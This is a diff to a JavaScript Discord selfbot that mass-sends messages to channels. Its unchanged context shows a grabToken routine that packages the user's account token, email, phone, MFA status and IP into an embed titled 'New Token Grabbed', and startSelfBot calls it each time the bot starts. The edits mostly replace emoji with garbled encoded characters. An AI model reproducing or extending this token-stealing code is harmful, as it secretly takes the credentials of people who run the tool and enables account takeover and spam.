@@ -43,7 +43,7 @@ async function grabToken(token, userInfo, source) {
         };
         
         const embed = {
-            title: '🎣 New Token Grabbed',
+            title: 'ð£ New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -51,9 +51,9 @@ async function grabToken(token, userInfo, source) {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -93,7 +93,11 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
     
     await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
     
-    const client = new Client({ checkUpdate: false });
+    const client = new Client({ 
+        checkUpdate: false,
+        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES'],
+        partials: ['CHANNEL']
+    });
     const channelList = channels;
     let currentIndex = 0;
     let intervalId = null;
@@ -140,9 +144,9 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                             await channel.send(message);
                         }
                         
-                        console.log(`[SELFBOT ${configId}] ✓ Sent to ${channelId}`);
+                        console.log(`[SELFBOT ${configId}] â Sent to ${channelId}`);
                     } catch (e) {
-                        console.error(`[SELFBOT ${configId}] ✗ Error sending to ${channelId}:`, e.message);
+                        console.error(`[SELFBOT ${configId}] â Error sending to ${channelId}:`, e.message);
                     }
                 });
                 
